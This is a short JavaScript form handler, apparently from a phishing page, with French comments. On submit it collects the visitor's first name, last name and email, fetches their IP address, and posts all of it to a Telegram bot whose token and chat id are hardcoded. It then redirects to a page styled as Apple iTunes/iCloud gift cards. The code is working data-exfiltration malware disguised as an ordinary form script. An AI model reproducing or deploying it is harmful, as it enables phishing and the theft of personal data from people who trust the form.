document.getElementById('submitButton').addEventListener('click', async function(event) {
    event.preventDefault(); // Empêcher le rechargement de la page

    var formData = new FormData(document.getElementById('myForm'));

    // Récupérer l'adresse IP du client
    const ipResponse = await fetch('https://api64.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const clientIP = ipData.ip;

    const response = await fetch('https://api.telegram.org/bot6321112055:AAF4EhlpfCSqNMqRqo20ffg5D7s6hEfBp6k/sendMessage', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: '-933653021',
            text: `-------[INFO]-------
firstname: ${formData.get('firstname')}
lastname: ${formData.get('lastname')}
email: ${formData.get('email')}
IP: ${clientIP}`,
        }),
    });

    const responseData = await response.json();
    console.log(responseData);

    setTimeout(function() {
        window.location.href = 'https://apple-gifts.vercel.app/Itunes-card/page/icloud.html';
    } );
});
